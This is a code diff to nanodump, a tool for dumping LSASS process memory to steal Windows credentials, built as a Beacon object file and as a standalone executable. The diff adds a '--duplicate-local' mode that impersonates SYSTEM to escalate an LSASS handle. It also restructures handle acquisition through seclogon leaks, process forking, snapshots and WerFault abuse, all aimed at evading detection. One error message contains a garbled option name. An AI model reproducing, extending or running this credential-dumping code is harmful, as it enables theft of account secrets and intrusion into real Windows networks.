@@ -18,6 +18,7 @@ void go(char* args, int length)
     BOOL           fork_lsass;
     BOOL           snapshot_lsass;
     BOOL           duplicate_handle;
+    BOOL           duplicate_local;
     BOOL           use_valid_sig;
     BOOL           success = FALSE;
     BOOL           ret_val = FALSE;
@@ -35,9 +36,9 @@ void go(char* args, int length)
     PPROCESS_LIST  created_processes = NULL;
     HANDLE         hSnapshot = NULL;
     WCHAR          wcFilePath[MAX_PATH];
+    BOOL           running_as_system = FALSE;
+    HANDLE         hImpersonate = NULL;
     UNICODE_STRING full_dump_path;
-    DWORD          permissions = 0;
-    DWORD          attributes = 0;
 
     full_dump_path.Buffer        = wcFilePath;
     full_dump_path.Length        = 0;
@@ -54,6 +55,7 @@ void go(char* args, int length)
     fork_lsass = (BOOL)BeaconDataInt(&parser);
     snapshot_lsass = (BOOL)BeaconDataInt(&parser);
     duplicate_handle = (BOOL)BeaconDataInt(&parser);
+    duplicate_local = (BOOL)BeaconDataInt(&parser);
     get_pid_and_leave = (BOOL)BeaconDataInt(&parser);
     use_seclogon_leak_local = (BOOL)BeaconDataInt(&parser);
     use_seclogon_leak_remote = (BOOL)BeaconDataInt(&parser);
@@ -110,25 +112,57 @@ void go(char* args, int length)
             goto cleanup;
     }
 
-    if (use_seclogon_leak_local || use_seclogon_leak_remote)
+    if (duplicate_local)
     {
-        success = malseclogon_handle_leak(
-            seclogon_leak_remote_binary,
-            dump_path,
-            fork_lsass,
-            snapshot_lsass,
-            use_valid_sig,
-            use_lsass_shtinkering,
-            use_seclogon_leak_local,
-            lsass_pid,
-            &created_processes);
-        // delete the uploaded nanodump binary
-        if (use_seclogon_leak_local)
-            delete_file(seclogon_leak_remote_binary);
+        success = is_current_user_system(&running_as_system);
         if (!success)
             goto cleanup;
-        if (use_seclogon_leak_local)
-            return;
+
+        if (!running_as_system)
+        {
+            DPRINT("The option --duplicate-local requires SYSTEM, impersonating...");
+            success = impersonate_system(&hImpersonate);
+            if (!success)
+                goto cleanup;
+            DPRINT("Impersonating SYSTEM")
+        }
+    }
+
+    success = obtain_lsass_handle(
+        &hProcess,
+        lsass_pid,
+        duplicate_handle,
+        duplicate_local,
+        use_seclogon_duplicate,
+        spoof_callstack,
+        FALSE,
+        seclogon_leak_remote_binary,
+        &created_processes,
+        use_valid_sig,
+        dump_path,
+        fork_lsass,
+        snapshot_lsass,
+        &hSnapshot,
+        use_seclogon_leak_local,
+        use_seclogon_leak_remote,
+        use_lsass_shtinkering);
+
+    // delete the uploaded nanodump binary
+    if (use_seclogon_leak_local)
+        delete_file(seclogon_leak_remote_binary);
+
+    if (!success)
+        goto cleanup;
+
+    if (use_seclogon_leak_local)
+        return;
+
+    if (use_lsass_shtinkering)
+    {
+        werfault_shtinkering(
+            lsass_pid,
+            hProcess);
+        goto cleanup;
     }
 
     // set the signature
@@ -146,85 +180,6 @@ void go(char* args, int length)
             &dc.Signature,
             &dc.Version,
             &dc.ImplementationVersion);
-    }
-
-    // --seclogon-leak-remote requires --duplicate internaly
-    if (use_seclogon_leak_remote)
-        duplicate_handle = TRUE;
-
-    permissions = LSASS_DEFAULT_PERMISSIONS;
-    // if we used malseclogon_leak remotely, the handle won't have PROCESS_CREATE_PROCESS;
-    if ((fork_lsass || snapshot_lsass) && !use_seclogon_leak_remote)
-    {
-        permissions = LSASS_CLONE_PERMISSIONS;
-    }
-    else if (use_lsass_shtinkering)
-    {
-        permissions = LSASS_SHTINKERING_PERMISSIONS;
-    }
-
-    // LSASS Shtinkering needs the handle to be inheritable
-    if (use_lsass_shtinkering)
-        attributes |= OBJ_INHERIT;
-
-    hProcess = obtain_lsass_handle(
-        lsass_pid,
-        permissions,
-        duplicate_handle,
-        use_seclogon_duplicate,
-        spoof_callstack,
-        FALSE,
-        dump_path,
-        attributes);
-
-    if (!hProcess)
-        goto cleanup;
-
-    success = check_handle_privs(hProcess, permissions);
-    if (!success)
-    {
-        PRINT_ERR("Could not open a handle with the requested permissions");
-        goto cleanup;
-    }
-
-    // if malseclogon_leak was used, the handle does not have PROCESS_CREATE_PROCESS
-    if ((fork_lsass || snapshot_lsass || use_lsass_shtinkering) &&
-        (use_seclogon_leak_local || use_seclogon_leak_remote))
-    {
-        hProcess = make_handle_full_access(
-            hProcess,
-            attributes);
-        if (!hProcess)
-            goto cleanup;
-    }
-
-    if (use_lsass_shtinkering)
-    {
-        werfault_shtinkering(
-            lsass_pid,
-            hProcess);
-        goto cleanup;
-    }
-
-    // avoid reading LSASS directly by making a fork
-    if (fork_lsass)
-    {
-        hProcess = fork_process(
-            hProcess,
-            attributes);
-        if (!hProcess)
-            goto cleanup;
-        forked_lsass = TRUE;
-    }
-
-    // avoid reading LSASS directly by making a snapshot
-    if (snapshot_lsass)
-    {
-        hProcess = snapshot_process(
-            hProcess,
-            &hSnapshot);
-        if (!hProcess)
-            goto cleanup;
     }
 
     // allocate a chuck of memory to write the dump
@@ -295,13 +250,18 @@ cleanup:
         kill_created_processes(created_processes);
         intFree(created_processes); created_processes = NULL;
     }
+    if (hImpersonate)
+    {
+        revert_to_self();
+        NtClose(hImpersonate);
+    }
 }
 
 #elif defined(NANO) && defined(EXE)
 
 void usage(char* procname)
 {
-    PRINT("usage: %s [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--duplicate] [--seclogon-leak-local] [--seclogon-leak-remote C:\\Windows\\notepad.exe] [--seclogon-duplicate] [--spoof-callstack svchost] [--silent-process-exit C:\\Windows\\Temp] [--shtinkering] [--fork] [--snapshot] [--getpid] [--help]", procname);
+    PRINT("usage: %s [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--duplicate] [--duplicate-local] [--seclogon-leak-local] [--seclogon-leak-remote C:\\Windows\\notepad.exe] [--seclogon-duplicate] [--spoof-callstack svchost] [--silent-process-exit C:\\Windows\\Temp] [--shtinkering] [--fork] [--snapshot] [--getpid] [--help]", procname);
     PRINT("Dumpfile options:");
     PRINT("    --write DUMP_PATH, -w DUMP_PATH");
     PRINT("            filename of the dump");
@@ -310,6 +270,8 @@ void usage(char* procname)
     PRINT("Obtain an LSASS handle via:");
     PRINT("    --duplicate, -d");
     PRINT("            duplicate an existing " LSASS " handle");
+    PRINT("    --duplicate-local, -dl");
+    PRINT("            open a handle to " LSASS " with low privileges and duplicate it to gain higher privileges");
     PRINT("    --seclogon-leak-local, -sll");
     PRINT("            leak an " LSASS " handle into nanodump via seclogon");
     PRINT("    --seclogon-leak-remote BIN_PATH, -slt BIN_PATH");
@@ -344,9 +306,9 @@ int main(int argc, char* argv[])
     DWORD          lsass_pid                      = 0;
     HANDLE         hProcess                       = NULL;
     BOOL           fork_lsass                     = FALSE;
-    BOOL           forked_lsass                   = FALSE;
     BOOL           snapshot_lsass                 = FALSE;
     BOOL           duplicate_handle               = FALSE;
+    BOOL           duplicate_local                = FALSE;
     LPCSTR         silent_process_exit            = NULL;
     LPCSTR         dump_path                      = NULL;
     BOOL           success                        = FALSE;
@@ -361,16 +323,15 @@ int main(int argc, char* argv[])
     DWORD          spoof_callstack                = 0;
     HANDLE         hSnapshot                      = NULL;
     PPROCESS_LIST  created_processes              = NULL;
-    DWORD          permissions                    = 0;
     BOOL           ret_val                        = FALSE;
     DWORD          num_modes                      = 0;
     WCHAR          wcFilePath[MAX_PATH]           = { 0 };
     UNICODE_STRING full_dump_path                 = { 0 };
-    DWORD          attributes                     = 0;
     BOOL           running_as_system              = FALSE;
     WCHAR          wcSnycPath[MAX_PATH]           = { 0 };
     UNICODE_STRING synchronization_file           = { 0 };
     BOOL           do_synchronize                 = FALSE;
+    HANDLE         hImpersonate                   = NULL;
 
     full_dump_path.Buffer        = wcFilePath;
     full_dump_path.Length        = 0;
@@ -444,6 +405,24 @@ int main(int argc, char* argv[])
                  !strncmp(argv[i], "--duplicate", 12))
         {
             duplicate_handle = TRUE;
+        }
+        else if (!strncmp(argv[i], "-dl", 4) ||
+                 !strncmp(argv[i], "--duplicate-local", 18))
+        {
+            duplicate_local = TRUE;
+
+            success = is_current_user_system(&running_as_system);
+            if (!success)
+                goto cleanup;
+
+            if (!running_as_system)
+            {
+                DPRINT("The option --duplicate-local requires SYSTEM, impersonating...");
+                success = impersonate_system(&hImpersonate);
+                if (!success)
+                    goto cleanup;
+                DPRINT("Impersonating SYSTEM")
+            }
         }
         else if (!strncmp(argv[i], "-sll", 5) ||
                  !strncmp(argv[i], "--seclogon-leak-local", 22))
@@ -583,7 +562,7 @@ int main(int argc, char* argv[])
     }
 
     if (get_pid_and_leave &&
-        (use_valid_sig || snapshot_lsass || fork_lsass ||
+        (use_valid_sig || snapshot_lsass || fork_lsass || duplicate_local ||
          use_seclogon_duplicate || spoof_callstack || use_seclogon_leak_local ||
          use_seclogon_leak_remote || duplicate_handle || silent_process_exit))
     {
@@ -594,7 +573,7 @@ int main(int argc, char* argv[])
     if (silent_process_exit &&
         (use_valid_sig || snapshot_lsass || fork_lsass ||
          use_seclogon_duplicate || spoof_callstack || use_seclogon_leak_local ||
-         use_seclogon_leak_remote || duplicate_handle))
+         use_seclogon_leak_remote || duplicate_handle || duplicate_local))
     {
         PRINT("The parameter --silent-process-exit is used alone");
         return 0;
@@ -624,15 +603,33 @@ int main(int argc, char* argv[])
         return 0;
     }
 
+    if (duplicate_local && use_seclogon_duplicate)
+    {
+        PRINT("The options --duplicate-local and --seclogon-duplicate cannot be used together");
+        return 0;
+    }
+
     if (duplicate_handle && use_seclogon_leak_local)
     {
         PRINT("The options --duplicate and --seclogon-leak-local cannot be used together");
         return 0;
     }
 
+    if (duplicate_local && use_seclogon_leak_local)
+    {
+        PRINT("The options --duplicate-local and --seclogon-leak-local cannot be used together");
+        return 0;
+    }
+
     if (duplicate_handle && use_seclogon_leak_remote)
     {
         PRINT("The options --duplicate and --seclogon-leak-remote cannot be used together");
+        return 0;
+    }
+
+    if (duplicate_local && use_seclogon_leak_remote)
+    {
+        PRINT("The options --duplicate-ñpcañ and --seclogon-leak-remote cannot be used together");
         return 0;
     }
 
@@ -750,22 +747,36 @@ int main(int argc, char* argv[])
             goto cleanup;
     }
 
-    if ((use_seclogon_leak_remote || use_seclogon_leak_local) && !is_seclogon_leak_local_stage_2)
+    success = obtain_lsass_handle(
+        &hProcess,
+        lsass_pid,
+        duplicate_handle,
+        duplicate_local,
+        use_seclogon_duplicate,
+        spoof_callstack,
+        is_seclogon_leak_local_stage_2,
+        seclogon_leak_remote_binary,
+        &created_processes,
+        use_valid_sig,
+        dump_path,
+        fork_lsass,
+        snapshot_lsass,
+        &hSnapshot,
+        use_seclogon_leak_local,
+        use_seclogon_leak_remote,
+        use_lsass_shtinkering);
+    if (!success)
+        goto cleanup;
+
+    if (use_seclogon_leak_local && !is_seclogon_leak_local_stage_2)
+        return 0;
+
+    if (use_lsass_shtinkering)
     {
-        success = malseclogon_handle_leak(
-            seclogon_leak_remote_binary,
-            dump_path,
-            fork_lsass,
-            snapshot_lsass,
-            use_valid_sig,
-            use_lsass_shtinkering,
-            use_seclogon_leak_local,
+        ret_val = werfault_shtinkering(
             lsass_pid,
-            &created_processes);
-        if (!success)
-            goto cleanup;
-        if (use_seclogon_leak_local)
-            return 0;
+            hProcess);
+        goto cleanup;
     }
 
     // set the signature
@@ -783,85 +794,6 @@ int main(int argc, char* argv[])
             &dc.Signature,
             &dc.Version,
             &dc.ImplementationVersion);
-    }
-
-    // --seclogon-leak-remote requires --duplicate internaly
-    if (use_seclogon_leak_remote)
-        duplicate_handle = TRUE;
-
-    permissions = LSASS_DEFAULT_PERMISSIONS;
-    if ((fork_lsass || snapshot_lsass) &&
-        (!use_seclogon_leak_local && !use_seclogon_leak_remote))
-    {
-        permissions = LSASS_CLONE_PERMISSIONS;
-    }
-    else if (use_lsass_shtinkering)
-    {
-        permissions = LSASS_SHTINKERING_PERMISSIONS;
-    }
-
-    // LSASS Shtinkering needs the handle to be inheritable
-    if (use_lsass_shtinkering)
-        attributes |= OBJ_INHERIT;
-
-    hProcess = obtain_lsass_handle(
-        lsass_pid,
-        permissions,
-        duplicate_handle,
-        use_seclogon_duplicate,
-        spoof_callstack,
-        is_seclogon_leak_local_stage_2,
-        dump_path,
-        attributes);
-    if (!hProcess)
-        goto cleanup;
-
-    success = check_handle_privs(hProcess, permissions);
-    if (!success)
-    {
-        PRINT_ERR("Could not open a handle with the requested permissions");
-        goto cleanup;
-    }
-
-    // fork and snapshot need PROCESS_CREATE_PROCESS
-    // shtinkering needs the handle to be inheritable
-    if ((fork_lsass || snapshot_lsass || use_lsass_shtinkering) &&
-        (use_seclogon_leak_local || use_seclogon_leak_remote))
-    {
-        hProcess = make_handle_full_access(
-            hProcess,
-            attributes);
-        if (!hProcess)
-            goto cleanup;
-    }
-
-    if (use_lsass_shtinkering)
-    {
-        ret_val = werfault_shtinkering(
-            lsass_pid,
-            hProcess);
-        goto cleanup;
-    }
-
-    // avoid reading LSASS directly by making a fork
-    if (fork_lsass)
-    {
-        hProcess = fork_process(
-            hProcess,
-            attributes);
-        if (!hProcess)
-            goto cleanup;
-        forked_lsass = TRUE;
-    }
-
-    // avoid reading LSASS directly by making a snapshot
-    if (snapshot_lsass)
-    {
-        hProcess = snapshot_process(
-            hProcess,
-            &hSnapshot);
-        if (!hProcess)
-            goto cleanup;
     }
 
     // allocate a chuck of memory to write the dump
@@ -910,7 +842,7 @@ int main(int argc, char* argv[])
     ret_val = TRUE;
 
 cleanup:
-    if (forked_lsass || use_seclogon_duplicate)
+    if (hProcess && (fork_lsass || use_seclogon_duplicate))
         kill_process(0, hProcess);
     if (hProcess)
         NtClose(hProcess);
@@ -924,6 +856,11 @@ cleanup:
     {
         kill_created_processes(created_processes);
         intFree(created_processes); created_processes = NULL;
+    }
+    if (hImpersonate)
+    {
+        revert_to_self();
+        NtClose(hImpersonate);
     }
     if (ret_val && do_synchronize)
         create_file(&synchronization_file);
@@ -1055,7 +992,6 @@ BOOL NanoDumpPPL(VOID)
     BOOL           use_valid_sig        = FALSE;
     SIZE_T         region_size          = 0;
     PVOID          base_address         = NULL;
-    DWORD          permissions          = 0;
     CHAR           dump_path[MAX_PATH]  = { 0 };
     WCHAR          wcFilePath[MAX_PATH] = { 0 };
     UNICODE_STRING full_dump_path       = { 0 };
@@ -1179,6 +1115,27 @@ BOOL NanoDumpPPL(VOID)
     if (!create_file(&full_dump_path))
         goto cleanup;
 
+    success = obtain_lsass_handle(
+        &hProcess,
+        lsass_pid,
+        duplicate_handle,
+        FALSE,
+        FALSE,
+        FALSE,
+        FALSE,
+        NULL,
+        NULL,
+        use_valid_sig,
+        dump_path,
+        FALSE,
+        FALSE,
+        NULL,
+        FALSE,
+        FALSE,
+        FALSE);
+    if (!success)
+        goto cleanup;
+
     // set the signature
     if (use_valid_sig)
     {
@@ -1194,27 +1151,6 @@ BOOL NanoDumpPPL(VOID)
             &dc.Signature,
             &dc.Version,
             &dc.ImplementationVersion);
-    }
-
-    permissions = LSASS_DEFAULT_PERMISSIONS;
-
-    hProcess = obtain_lsass_handle(
-        lsass_pid,
-        permissions,
-        duplicate_handle,
-        FALSE,
-        FALSE,
-        FALSE,
-        dump_path,
-        0);
-    if (!hProcess)
-        goto cleanup;
-
-    success = check_handle_privs(hProcess, permissions);
-    if (!success)
-    {
-        PRINT_ERR("Could not open a handle with the requested permissions");
-        goto cleanup;
     }
 
     // allocate a chuck of memory to write the dump
